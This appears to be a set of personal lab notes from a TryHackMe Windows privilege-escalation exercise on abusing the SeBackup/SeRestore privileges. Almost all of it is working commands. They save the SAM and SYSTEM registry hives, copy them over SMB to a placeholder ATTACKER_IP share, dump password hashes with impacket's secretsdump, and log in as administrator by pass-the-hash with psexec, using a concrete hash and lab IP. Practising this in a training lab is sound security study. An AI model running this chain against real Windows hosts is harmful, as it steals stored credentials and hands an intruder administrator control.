# Abusing dangerous privileges 

similar to sudo of linux.

- list pri
    ```cmd
    whoami /priv
    ```

## SeBackup / SeRestore

- backup SAM, SYSTEM hash
    ```cmd
    # reg save hklm\system [system_hash_out_file]
    reg save hklm\system C:\Users\THMBackup\system.hive

    # reg save hklm\sam [sam_hash_out_file]
    reg save hklm\sam C:\Users\THMBackup\sam.hive
    ```

- share file from windows to attacker's box
    - start smb server
        ```bash
        mkdir share
        python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
        ```
    - copy file to attacker's box
        ```cmd
            copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
            copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
        ```

- get users's password hash
    ```bash
    python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
    ```

- gain access by user's hash
    ```bash
    # python3.9 /opt/impacket/examples/psexec.py -hashes [hash_value] [user]@[ip]
    python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.233.86
    ```


